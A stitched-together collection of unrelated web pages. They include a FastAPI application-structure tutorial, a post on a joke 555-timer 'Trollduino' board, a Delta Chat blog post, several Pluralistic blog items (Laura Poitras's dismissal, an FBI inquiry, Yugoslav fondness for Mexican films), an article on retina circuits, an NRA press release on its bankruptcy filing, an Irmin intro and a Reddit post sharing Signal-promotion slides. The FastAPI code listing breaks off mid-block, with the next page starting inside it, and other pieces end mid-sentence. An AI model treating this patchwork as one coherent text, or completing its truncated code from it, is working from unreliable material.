<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-3d5c50e8=""><p data-v-3d5c50e8="">This article introduces an approach to structure FastAPI applications with multiple services in mind. The proposed structure decomposes the individual services into packages and modules, following principles of abstraction and separation of concerns. The code discussed below can also be studied in its entirety in a dedicated companion GitHub repository.</p>

<h2 id="fastapi--building-high-performing-python-apis" data-v-3d5c50e8="">FastAPI – Building High-performing Python APIs</h2>
<p data-v-3d5c50e8=""><a href="https://fastapi.tiangolo.com/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">FastAPI</a> is a fast, highly intuitive and well-documented API framework based on <a href="https://www.starlette.io/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Starlette</a>. Despite being relatively new, it's gaining <a href="https://star-history.t9t.io/#tiangolo/fastapi" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">strong adoption</a> by the developer community – it is even already being adopted in production by corporates like <a href="https://netflixtechblog.com/introducing-dispatch-da4b8a2a8072" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Netflix</a> and <a href="https://github.com/tiangolo/fastapi/pull/26" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Microsoft</a>.</p>
<p data-v-3d5c50e8="">Following the <a href="https://en.wikipedia.org/wiki/Unix_philosophy" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">UNIX philosophy</a> of <em data-v-3d5c50e8="">"doing one thing, and doing it well"</em>, separating parts of the application according to their task improves code readability and maintainability; ultimately reducing complexity. The main benefits of structuring applications in this way:</p>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Separation of concerns</strong> – Decomposing the application into modules performing a single job. This allows accepting requests (top down: controller → service → data access) and returning responses (bottom up: data access → service → controller) with a clear separation of what particular functionality should be implemented in which particular module, reducing cognitive load for development.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/6c6e6d1a9a2252c24c72049f74382abee765095c/9408a/_nuxt/img/request-response.df4b985.jpg" width="100%" height="" alt="Request-Response Flow across Application Layers" data-v-220acfa8=""></p><p data-v-220acfa8="">Request-Response Flow across Application Layers</p></div>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Abstraction</strong> — Components of the application are designed in a reusable way. For instance, <code data-v-3d5c50e8="">ServiceResult</code> is implemented as a generic outcome of a service operation (which may be successful and return a response, or unsuccessful and raise an exception) able to be used by all services of the app, keeping code <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">DRY</a>.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/fc6bd09df8db15e783bd11117eba8003350f04cc/465f4/_nuxt/img/directory-structure.0c63d71.jpg" width="100%" height="" alt="Directory Structure Overview" data-v-220acfa8=""></p><p data-v-220acfa8="">Directory Structure Overview</p></div>
<p data-v-3d5c50e8="">The granular nature of namespacing allow to distinguish parts of the application, e.g., routes versus business logic belonging to a particular service – grouping similar tasks together, while keeping distinct parts separated. Four principal packages are needed. For each service, one module is added to these four packages. For instance, a service called <em data-v-3d5c50e8="">"Foo"</em> requires the following modules (discussed in detail below):</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./routers/  foo.py </span><span data-v-3d5c50e8=""># Router instance and routes</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./services/ foo.py </span><span data-v-3d5c50e8=""># Business logic (including CRUD helpers)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./schemas/  foo.py </span><span data-v-3d5c50e8=""># Data "schemas" (e.g., Pydantic models)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./models/   foo.py </span><span data-v-3d5c50e8=""># Database models (e.g., SQLAlchemy models)</span></span></code></pre></div>
<p data-v-3d5c50e8="">The four principal packages are complemented by two generic packages which contain application-specific (and not service-specific) functionality, such as configuration or utility functions.</p>
<h2 id="controller-layer--routes" data-v-3d5c50e8="">Controller Layer – Routes</h2>
<p data-v-3d5c50e8="">Within <code data-v-3d5c50e8="">main</code>, the application is instantiated and all routers are included. Additionally, middlewares and/or exception handlers are implemented. The example application discussed below is based on a service called <code data-v-3d5c50e8="">Foo</code>, which requires a number of routes. To handle custom exceptions occurring at the service layer, as instances of class <code data-v-3d5c50e8="">AppExceptionCase</code>, a respective exception handler is added to the application.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8=""># ...</span></span>

<p data-v-3d5c50e8="">Routers and their routes are defined in modules within the <code data-v-3d5c50e8="">routers</code> package.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><p><span>If you’ve poked around on hacker blogs or forums for long enough, you’ve probably come across a comment like “you could have done that with a 555 timer,” or some collection of other discrete components. While perhaps such a project is possible, the person who came up with this insult </span><em>likely</em><span> didn’t actually make it with a 555 before hurling these insults into cyberspace.</span></p><p><span>Yes, a 555 timer is a simpler solution in some instances, but doesn’t come in a development board format like the Arduino Uno, which allows you to just plug components in and program. Or at least it didn’t until now. That's because Mild Lee Interested has designed the </span><a href="https://hackaday.io/project/176844-trollduino-v10" rel="nofollow">Trollduino</a><span>, which places an actual 555 timer onto an Uno-style board. Presumably this would let trolls who demean less experienced hackers’ blinky projects build them before putting words to a keyboard. Or maybe it could instead provide a moment of introspection to consider whether or such argument is actually worth it.</span></p><p><span>The build itself features a 555 IC, along with a variety of resistors and capacitors, and even has a barrel jack and USB connector for power. The device is pin-compatible with most Arduino shields, though as the write-up notes, its functionality </span><em>may</em><span>be limited. You can, however, actually run a blink sketch with a couple resistors and a capacitor.</span></p><p>Although a bit of a joke, a board like this could actually be a great way to learn about this venerable component. While a schematic is available as of this writing, the author may also publish the Gerber files if there is interest in the project.</p></div></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">✍️ Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don’t have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don’t even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>– <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn’t quite mature 2 years ago, I have to say it’s pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don’t use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:

<p>Seven years ago, the Academy-Award-winning documentarian Laura Poitras co-founded First Look Media, and its subsidiaries/sister companies The Intercept and Field of Vision.</p>
<p>Late last year, they fired her.</p>
<p>Poitras has published a lengthy letter about her dismissal in which she says that she was fired for publicly criticizing The Intercept's handling of the Reality Winner leaks – an incident that ended with Winner in federal prison for five years.</p>
<p><a href="https://www.praxisfilms.org/open-letter-from-laura-poitras/">https://www.praxisfilms.org/open-letter-from-laura-poitras/</a></p>
<p>The Intercept investigated its handling of the Winner leaks, and concluded that it made mistakes. But Poitras says that the internal investigation was never independent, and allowed people who were implicated in the failures to oversee the postmortem on those failures.</p>
<p>First Look says Poitras's dismissal was "natural," and the result of her "stepping away" from her duties at the company to do "her own projects."</p>
<p><a href="https://www.washingtonpost.com/lifestyle/media/laura-poitras-fired-intercept-first-look-reality-winner/2021/01/14/478a9c30-55e7-11eb-a08b-f1381ef3d207_story.html">https://www.washingtonpost.com/lifestyle/media/laura-poitras-fired-intercept-first-look-reality-winner/2021/01/14/478a9c30-55e7-11eb-a08b-f1381ef3d207_story.html</a></p>
<p>I have an interest here. I have sincere, deep admiration for Poitras. I contributed to the program book for her one-woman show at the Whitney, reported out a Snowden leak with her team, and one of my proudest moments was the cameo my book HOMELAND got in her doc CITIZENFOUR.</p>
<p>And I have worked with First Look; I worked for months on a video project with them, and then they optioned my novella UNAUTHORIZED BREAD. Everyone I've worked with there was bright, committed, passionate and good at their jobs.</p>
<p>Despite all that, I have no personal knowledge of any of the underlying facts.</p>
<p>Here's what I do know, though: Laura Poitras is one of the bravest, most talented filmmakers and journalists I know. She is both a good person and very good at what she does.</p>
<p>And I also know that The Intercept publishes some of the best investigative journalism today. Their work has been hugely important to me and my understanding of the world. Not a day goes by that I don't learn something profound from its work.</p>
<p>When you put those two facts together, here's what you get: profound sadness. A media entity that means a lot to me has fired one of their best journalists, who also helped found the organization. This is not a good day. Poitras's work is critical to this ghastly moment.</p>
<p>First Look is much poorer without her.</p>

<p>There came a point in my life as an RPG player where I largely stopped playing the games in favor of mostly thinking about the games, handling the materials, and reading the rulebooks.</p>
<p>The physicality of D&amp;D was always the most important part for me: the dice, the tables, the minis, the maps. I love me a D&amp;D object.</p>
<p>So I've backed "Tiny Paper Dungeons," Tom Brinton's Kickstarter campaign for a pocket-steno-pad-sized book of procedurally generated RPGs.</p>
<p><a href="https://www.kickstarter.com/projects/brintown/tiny-paper-dungeons/">https://www.kickstarter.com/projects/brintown/tiny-paper-dungeons/</a></p>
<p>Brinton's little game-book includes 50 dungeon maps that you play with a pencil and a D6, acquiring items and leveling up your stats.</p>
<p>The games are generated with Drawbot, and each pad is unique:</p>
<p><a href="https://www.drawbot.com/">https://www.drawbot.com/</a></p>
<p>The pads are printed in Utah, $5 each, for delivery in April. Brindle's done this stuff before and seems confident he can deliver (assuming covid doesn't shut down his printer).</p>
<p>As to gameplay, he says, "I'm trying to strip this genre down to its simplest form: 1 player, simple mechanics, no story-telling, just you, a die and pencil, and a series of simple decisions in the face of randomness."</p>
<p>I ordered two.</p>

<p>Yesterday was my 20th blogging anniversary. I admit that it carried more emotional freight than I expected. 20 years is a long time to do anything, let alone something that's so personal and yet so public.</p>
<p><a href="https://pluralistic.net/2021/01/13/two-decades/#hfbd">https://pluralistic.net/2021/01/13/two-decades/#hfbd</a></p>
<p>As it happens, an anonymous reader gave me a hell of a blogiversary gift: my first-ever FBI investigation! I've spoken to FBI agents before (Agent: Does your Tor exit node keep logs by any chance? Me: Nope. Agent: Dang), but I've never actually been <em>investigated</em>.</p>
<p>My phone rang with an unfamiliar local number. A calm voice on the other end introduced itself as an FBI special agent with the LA office. I pointed out that this was an unlikely claim and asked for a switchboard number I could call back on.</p>
<p>The agent said this was an entirely reasonable thing to do. A few minutes later, I was back on the phone with him.</p>
<p>Me: What can I do for you?</p>
<p>Him: I'm calling about a blog post you published. I'm sure you know which.</p>
<p>Me: Uh, no.</p>
<p>Him: The one about toppling statues.</p>
<p>He meant this post:</p>
<p><a href="https://pluralistic.net/2020/07/03/monument-toppling-season/#leverage">https://pluralistic.net/2020/07/03/monument-toppling-season/#leverage</a></p>
<p>tldr: it's a link to a Popular Mechanics article on the science of toppling monuments, with a brief intro and summary.</p>
<p>There's nothing illegal in that post, but also you should never talk to cops without a lawyer, so I asked him if he minded my setting up a time to make that happen. He said that was fine with him.</p>
<p>My EFF colleague Mark Rumold was kind enough to volunteer to call the special agent. He reported back shortly thereafter to say that the agent was responding to a complaint, and that he agreed my post was not unlawful in any way.</p>
<p>Mark confirmed for the agent that I was not planning any unlawful activity, and the agent asked him to remind me that people can misinterpret the things we publish on the internet.</p>
<p>That was it.</p>
<p>It was an anticlimax, sure. I confess that I was a little freaked out. It was just the anniversary of Aaron Swartz's death, and my mind kept going back to his account of the time the FBI showed up to ask him about PACER, and the horrors that followed.</p>
<p>But it's over. The agent, to his credit, was pleasant and reasonable. But I'm mystified by the complaint – my guess is some troll has figured out that you can sic the FBI on people you disagree with on the internet – and even more by the fact that the FBI acted on it.</p>
<p>They must have the discretion to decide when a complaint rises to the level of using a special agent's time and when it should go in the kook folder. Seems to me that filing complaints about my post in the kook folder should have been a no-brainer.</p>
<p>I'm looking into using FOIA and the 1974 Privacy Act to find out what kind of file this generated, and to have that record expunged.</p>
<p><a href="https://www.eff.org/deeplinks/2019/09/victory-individuals-can-force-government-purge-records-their-first-amendment">https://www.eff.org/deeplinks/2019/09/victory-individuals-can-force-government-purge-records-their-first-amendment</a></p>
<p>In the meantime, I'm declaring a federal criminal investigation to be the Official 20th Blogiversary gift.</p>

<p>The Cold War is memorialized as a moment in which the world split into two: the east and west, the Warsaw Pact and NATO. But a sizeable number of countries sat out the Cold War, and many of them formed a third bloc called the "nonaligned countries."</p>
<p>The nonaligned movement's founding member was Yugoslavia, and it became a socialist republic on the USSR's doorstep that had a simmering (and at times openly) hostile relationship with its vast neighbor.</p>
<p>This betwixt/between posture left Yugoslavia cut off from both Hollywood movies and Soviet cinema: naturally, they turned to the Mexican film industry.</p>
<p>The 1950s and 60s were the Yu-Mex moment, when the nation thrilled to imported Mexican movies that glorified the Mexican revolution. On Global Voices, Filip Stojanovski tells the story of a quarter century of Yugoslavian …</p></div></article></div>

        <p><img src="https://i-kh.net/images/retina-circuits-more-than-just-pixels/retina.png" alt=""></p>
<p>_There’s also a <a href="https://youtu.be/LMNuOn5B_VA" target="_blank" rel="noopener">YouTube version</a> of this article._</p>
<p>The picture above shows some (far from everything!) of what we know about the cells and neural circuits in the human retina. </p>
<p>What’s interesting is - the retina is not just a light detection organ. It’s a complex electro-chemical calculator with three neural layers, and it uses these layers to extract a number of useful signals from the light that hits our eyes.</p>
<p>Below, we’ll step through some of the more interesting features of the retina, but if you’d like to learn more, the above picture (and this article) are mostly based on <a href="https://www.sciencedirect.com/science/article/pii/S1350946220300161" target="_blank" rel="noopener">this review article</a> published in Feb 2020 in the journal Progress in Retinal and Eye Research, and on chapter 17 of the latest edition of <a href="https://www.amazon.com/Ryans-Retina-Andrew-P-Schachat/dp/032340197X" target="_blank" rel="noopener">Ryan’s Retina</a>.</p>
<h2 id="Photoreceptors-are-always-on-except-when-there’s-light"><a href="#Photoreceptors-are-always-on-except-when-there’s-light" title="Photoreceptors are always on - except when there’s light"></a>Photoreceptors are always on - except when there’s light</h2><p><img src="https://i-kh.net/images/retina-circuits-more-than-just-pixels/rods-and-cones.png" alt=""></p>
<p>The photoreceptor cells in the vertebrate retina - rods and cones - are at the very back of the eye, behind the other layers of neurons. </p>
<p>Cones work best in bright light and can detect colors. In humans, there are three types of cone cells, each specializing in detecting red, green, and blue light. Rods work best in the dark, but can’t detect colors - just the brightness level.</p>
<p>Since the photoreceptors are at the very back of the retina, light has to navigate a tangled maze of neuronal bodies and wires to get to them. It does so using something called Müller cells (not shown), that stretch across the entire thickness of the retina and act like fiberoptic cables.</p>
<p>When the light gets to the photoreceptors, it turns them <em>down</em>. In complete darkness, the photoreceptors continuously emit neurotransmitters (“fire”, or “are excited”) at their maximum rate. The light inhibits them.</p>
<h2 id="Parallel-channels-for-brightness-and-darkness-levels"><a href="#Parallel-channels-for-brightness-and-darkness-levels" title="Parallel channels for brightness and darkness levels"></a>Parallel channels for brightness and darkness levels</h2><p><img src="https://i-kh.net/images/retina-circuits-more-than-just-pixels/on-and-off-pathways.png" alt=""></p>
<p>For red and green cones, right from the start, the signal splits into two separate channels: ON cells, which fire neurotransmitters when the light is shining on their cone, and OFF cells that fire when the light is <em>not</em> shining on their cone.</p>
<p>Since the cones fire most when it’s dark, we can say that they produce the OFF (darkness) signal. So how do the ON cells fire when there’s light? Well, the ON bipolar cells are intrinsically excited and want to fire neurotransmitters, but they get inhibited by the photoreceptors. So as long as the photoreceptors are firing, ON bipolar cells aren’t. When there’s light (and photoreceptors stop firing), ON bipolar cells are no longer inhibited, and produce more neurotransmitters.</p>
<p>Why are there two channels instead of just one? Good question. Maybe so that it’s easier to recognize dark objects on light backgrounds more easily?</p>
<p>Either way, as far as we can tell, this ON/OFF channel pair only occurs with the red and green cones. Blue cones and rods have only ON bipolar cells. Though with rods, the story is a bit more complicated.</p>
<h2 id="Rod-signals-are-carefully-fed-into-cone-pathways"><a href="#Rod-signals-are-carefully-fed-into-cone-pathways" title="Rod signals are carefully fed into cone pathways"></a>Rod signals are carefully fed into cone pathways</h2><p><img src="https://i-kh.net/images/retina-circuits-more-than-just-pixels/rod-pathway.png" alt=""></p>
<p>Humans (and other primates) have a fantastic vision. One of its crazy feats is that it can see across 10 log units of light intensity by using different light detectors and different retinal circuits in different lighting conditions. </p>
<p>Rods can detect single photons (!) and become saturated when it gets brighter than dusk/dawn. Rod signals are further amplified by neurons that collect multiple rod signals, suppress the noise, and feed the signals into the cone signal pathways.</p>
<p>This is done with help of the so-called AII amacrine cells (that’s roman numeral “2”, so it’s really “A2”, but the literature calls it “AII” for historical reasons). These AII cells collect inputs from the rod bipolar cells (which come only in ON variety), and use that signal to inhibit the cone OFF bipolar cells, as well as directly feed voltage into the ON bipolar cells through the connections called “gap junctions”.</p>
<p>This way, even when it’s dark, the same parts of the brain can be used to process the incoming information even though it’s been collected by a different set of photoreceptors.</p>
<h2 id="Motion-gets-detected-starting-in-the-retina"><a href="#Motion-gets-detected-starting-in-the-retina" title="Motion gets detected starting in the retina"></a>Motion gets detected starting in the retina</h2><p>Some output neurons - Parasol cells (ON and OFF varieties) and Recursive cells - produce the biggest response when the stimulus moves across its visual field. </p>
<p>What kind of neuron circuits make that happen?</p>
<p>For parasol cells, <a href="https://www.cell.com/neuron/pdf/S0896-627318%2930105-3.pdf" target="_blank" rel="noopener">this paper</a> suggests that it’s a network of special diffuse bipolar cells that makes it happen.</p>
<p>When the signal moves left to right in the image below, the bipolar cells excite each other through gap junctions that let voltage jump from one cell to the next.</p>
<p><img src="https://i-kh.net/images/retina-circuits-more-than-just-pixels/parasol-cell.png" alt=""></p>
<p>Due to the internal mechanisms of neurons, these signals add more than linearly and produce a big response in the last bipolar neuron - ultimately exciting the parasol cell a lot.</p>
<h2 id="Horizontal-cells-sharpen-the-picture"><a href="#Horizontal-cells-sharpen-the-picture" title="Horizontal cells sharpen the picture"></a>Horizontal cells sharpen the picture</h2><p><img src="https://i-kh.net/images/retina-circuits-more-than-just-pixels/horizontal-cell.png" alt=""></p>
<p>Retina also has a number of circuits for sharpening the image and enhancing the contrast.</p>
<p>One of them involves the so-called “horizontal cells” (yellow “H1” and “H2” cell in the image at the start of this post). These live in the same layer as the bipolar cells and connect to a lot of nearby cones.</p>
<p>The way the horizontal cells work is pretty clever: they are excited by the cones, and then, in turn, inhibit the cones back. </p>
<p>To see how these sharpen the image, let’s carefully look at what happens when the light shines only on one photoreceptor in the picture above.</p>
<p>If only one cone receives light, then </p>
<ol>
<li>It fires less, so</li>
<li>Horizontal cell is less excited, and so it fires less too, therefore</li>
<li>Horizontal cell doesn’t inhibit the other surrounding cones as much, and so</li>
<li>Other cones fire more, producing a stronger OFF (darkness) signal.</li>
</ol>
<p>The result is that we see a bright dot surrounded by a darker ring, making the dot more prominent.</p>
<p>By the way, this type of center-surround contrast enhancement is a common feature across all sensory systems, including touch, hearing, and smell.</p>
<p>Like image sharpening in Photoshop, this process can leave artifacts. The most famous one is below - the <a href="https://en.wikipedia.org/wiki/Grid_illusion" target="_blank" rel="noopener">Hermann grid</a>. The dark spots at the intersections disappear when you look straight at them because the surround inhibition fields are larger at the periphery of vision than in the center.</p>
<p><img src="https://i-kh.net/images/retina-circuits-more-than-just-pixels/hermann-grid.gif" alt=""></p>
<h2 id="Blue-cones-are-lower-class-citizens-in-the-retina"><a href="#Blue-cones-are-lower-class-citizens-in-the-retina" title="Blue cones are lower-class citizens in the retina."></a>Blue cones are lower-class citizens in the retina.</h2><p>For various reasons, blue cones get treated differently by the retina. They sit a bit farther back from green and red cones, they don’t get OFF channels, and there aren’t output (ganglion) cells that produce a pure blue signal.</p>
<p>Instead, the ganglion cells responsible for blue color combine blue ON signal together with red+green (= yellow) OFF signal to produce a “relatively blue” signal.</p>
<p>Blue cones are also sparser and aren’t present in the very center of the retina. This is in part because the lens in the eye produces chromatic aberrations at shorter wavelengths, and tighter spacing between blue cones wouldn’t help us see better.</p>
<h2 id="Dopamine-acts-as-additional-gain-control"><a href="#Dopamine-acts-as-additional-gain-control" title="Dopamine acts as additional gain control"></a>Dopamine acts as additional gain control</h2><p>Retina also adapts to light through Dopaminergic Amacrine Cells (DAC - dark blue on the diagram above). They spread their tentacles throughout the retina and around the bodies of some neurons. </p>
<p>When the light becomes bright enough, they ramp up the dopamine production, which in turn lowers the volume in the retinal circuits through <a href="https://www.sciencedirect.com/science/article/pii/S1347861319310448" target="_blank" rel="noopener">various mecanisms</a>.</p>

The move will enable long-term, sustainable growth and ensure the NRA’s continued success as the nation’s leading advocate for constitutional freedom – free from the toxic political environment of New York. </p><p>The NRA plan, which involves utilizing the protection of the bankruptcy court, has the Association dumping New York and organizing its legal and regulatory matters in an efficient forum. The move comes at a time when the NRA is in its strongest financial condition in years.</p><p>The NRA will continue with the forward advancement of the enterprise – confronting anti-Second Amendment activities, promoting firearm safety and training, and advancing public programs across the United States. There will be no immediate changes to the NRA’s operations or workforce.&nbsp;&nbsp;</p><p>The Association will seek court approval to reincorporate the Association in the State of Texas – home to more than 400,000 NRA members and site of the 2021 NRA Annual Meeting in Houston. </p><p>“This strategic plan represents a pathway to opportunity, growth and progress,” says NRA CEO &amp; EVP Wayne LaPierre. “Obviously, an important part of this plan is ‘dumping New York.’ The NRA is pursuing reincorporating in a state that values the contributions of the NRA, celebrates our law-abiding members, and will join us as a partner in upholding constitutional freedom. This is a transformational moment in the history of the NRA.”</p><p>The restructuring plan aims to streamline costs and expenses, proceed with pending litigation in a coordinated and structured manner, and realize many financial and strategic advantages.</p><p><span><strong>The Path Forward</strong></span></p><p>The NRA will move quickly through the restructuring process. Its day-to-day operations, training programs, and Second Amendment advocacy will continue as usual.</p><p>By exiting New York, where the NRA has been incorporated for approximately 150 years, the NRA abandons a state where elected officials have weaponized the legal and regulatory powers they wield to penalize the Association and its members for purely political purposes.</p><p>In the summer of 2018, then New York Attorney General candidate Letitia James vowed that, if elected, she would use the powers of her office to investigate the “legitimacy” of the NRA. </p><p>Without a shred of evidence to support the claim, she called the Association a “terrorist organization” and a “criminal enterprise.” As promised, she commenced an “investigation” upon being elected to the Office of NYAG and, predictably, filed a lawsuit seeking to dissolve the NRA just prior to the November 2020 national election.</p><p>The NRA filed a lawsuit in August 2020 against the NYAG similar to its lawsuit against New York Governor Andrew Cuomo and the New York State Department of Financial Services, filed in 2018. The NRA pursues the defendants for attempting to “blacklist” the organization and its financial partners in violation of their First Amendment rights. The NRA will continue those legal actions. &nbsp;</p><p>“Under this plan, the Association wisely seeks protection from New York officials who it believes have illegally weaponized their powers against the NRA and its members,” says William A. Brewer III, counsel to the NRA in those cases. “The NRA will continue the fight to protect the interests of its members in New York – and all forums where the NRA is unlawfully singled out for its Second Amendment advocacy.”</p><p>With respect to its headquarters, the NRA has formed a committee to study opportunities for relocating segments of its business operations to Texas or other states. The Association&nbsp;will analyze whether a move of its headquarters, now located in Fairfax, Virginia, is in the best interests of its members. In the meantime, the NRA’s general business operations will remain in Fairfax.</p><p>To facilitate its strategic plan and restructuring, the NRA and one of its subsidiaries filed voluntary chapter 11 petitions in the United States Bankruptcy Court for the Northern District of Texas, Dallas Division. Chapter 11 proceedings are routinely utilized by businesses, nonprofits and organizations of all kinds to streamline legal and financial affairs. &nbsp;</p><p>The NRA also announced Marschall Smith will serve as Chief Restructuring Officer. A former Senior Vice President and General Counsel of 3M Company, Smith has more than 35 years of legal and business experience with an emphasis on compliance, corporate finance, and corporate governance.</p><p>“I am honored to join the nation’s oldest and largest civil rights organization during this important time,” Smith says. “Our goal is to work through the restructuring process efficiently and quickly – even as NRA leadership approaches 2021 with renewed energy and an expanding national platform. This plan has no impact on the NRA’s most important goal:&nbsp; serving its membership and protecting the Second Amendment.”</p><p>The NRA will propose a plan that provides for payment in full of all valid creditors’ claims. The Association expects to uphold commitments to employees, vendors, members, and other community stakeholders.</p><p>“The plan allows us to protect the NRA and go forward with a renewed focus on Second Amendment advocacy,” says NRA President Carolyn Meadows. “We will continue to honor the trust placed in us by employees, members and other stakeholders – following a blueprint that allows us to become the strongest NRA ever known.” </p><p><strong>Additional Information:</strong></p><p>Patrick J. Neligan of Neligan LLP, Dallas, Texas, is serving as debtor’s counsel; William (Wit) Davis is counsel to the NRA Board of Directors and its Special Litigation Committee; Brewer, Attorneys &amp; Counselors, Dallas, Texas, serves as special counsel to the NRA.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/mirage/irmin">Irmin</a> is a key-value store based on the same principles as Git. This means
that for existing Git users it provides many familiar features:
branching/merging, history and the ability to restore to any previous state.</p>
<p>Typically Irmin is accessed by embedding it into an OCaml application, but can
also be accessed using HTTP using <code>irmin-http</code> or GraphQL using <code>irmin-graphql</code>.
It is most often used to store application data, like configuration values,
shared state or checkpoint data, but there is nothing stopping you from using it
as a general purpose key-value store too. Additionally, since it is compatible
with Git, Irmin can be used to interact with Git repositories directly from
within your application.</p>
<p>Take a moment to skim the <a href="https://github.com/mirage/irmin/blob/master/README.md">README</a> to familiarize yourself with
some of the concepts. Also, if you find that anything is missing or unclear in
this tutorial then please file <a href="https://github.com/mirage/irmin.org/issues">an issue</a>!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!-- SC_OFF --><div><p><strong>**UPDATE: Ready to use after WA announced T&amp;C delay! New languages: Slovak, Czech, Portuguese (PT), Finnish, Turkish, Hindi, Spanish, Portuguese (BR), Italian, French, Dutch - more coming soon*\</strong>*</p>

<blockquote>
<p>Hey there, I'm using Signal!</p>
</blockquote>

<p>When people switch to Signal they often have the problem to convince all their contacts from WhatsApp to do the same. I had that struggle too.</p>

<p>That's why I created something to put into my WhatsApp Status: around 20 slides explaining why to switch and why I am going to delete WhatsApp. I think it's better to be educational than pushy or insulting to get people to switch, so I tried it this way and successfully got my family and friends to switch to Signal.</p>

<p>Now I decided to share the slides with you and hope they help you too!</p>



<p>There are 2 versions for each language: One including a comment about GDPR (for EU citizens) and one that does not mention anything about GDPR (rest of world).</p>

<p>F<em>or UK users:</em> <a href="https://teddit.net/u/Winnie_the_Pooch">u/Winnie_the_Pooch</a> <em>commented: "[...] use the EU version. Even though weâ€™ve now left, the EU GDPR has (thankfully!) been enshrined in British law as the</em> <a href="https://ico.org.uk/for-organisations/dp-at-the-end-of-the-transition-period/data-protection-now-the-transition-period-has-ended/the-gdpr/"><em>UK GDPR</em></a> <em>[...]". Lucky you!</em></p>



<p>WhatsApp delays their privacy policy update to <strong>mid of may</strong>!</p>

<p><strong>But this does not change the facts mentioned in the slides about metadata etc.!</strong> So, why should you wait until may? On the other hand, you now have more time to convince your contacts to switch!</p>

<p><strong>UPDATE:</strong> I updated each version like the following:</p>

<ul>
<li>The first slide does not have a headline anymore. You can add your own text here using the editing options in WhatsApp (its the T on the top right) or your favorite graphic editing software. Write something along the line as "I will delete WhatsApp on [insert date here]" or similar.</li>
<li>I replaced the last two chat messages on slide 03 with the text from slide 04. Total amount of slides reduced to 19!</li>
</ul>

<p><strong>Before sharing your new WhatsApp Status check if the Signal service is currently up and running:</strong> <a href="https://status.signal.org/">status.signal.org</a> (if it is down you should wait, as your contacts may not be able to register!)</p>

<p><strong>How to contribute</strong></p>

<p><em>Coming soon</em> means you don't have to send me translations for this language anymore, I just need to add them. Please be patient.</p>

<p>If you like to have the status in your language too: <a href="https://pastebin.com/Fc9Xcadi">here is the raw text</a> (try to not change the formatting please). Please translate only into languages you are fluent in.</p>

<p>!Please also provide a screenshot of the "New privacy policy" message  in your language for the 2nd slide. Search the web if needed!</p>



<p>Please look into related subreddits to get familiar with the topic:</p>

<ul>
<li><a href="https://teddit.net/r/signal">r/signal</a></li>
<li><a href="https://teddit.net/r/whatsapp">r/whatsapp</a></li>
<li><a href="https://teddit.net/r/privacy">r/privacy</a></li>
<li><a href="https://teddit.net/r/privacytoolsIO">r/privacytoolsIO</a></li>
</ul>

<p><strong>How to add WhatsApp Status in the correct order</strong></p>

<ol>
<li>First, take a look in your WhatsApp Status privacy settings and make sure to select all the contacts you want to see your new status.</li>
<li>Open the gallery app.</li>
<li>Select all images, starting from the first slide (1-19).</li>
<li>Press share.</li>
<li>Select WhatsApp.</li>
<li>Select "My Status" &amp; make sure the slides are in the correct order.</li>
<li>Add your custom intro text on slide 01.</li>
<li>Send. Done.</li>
</ol>

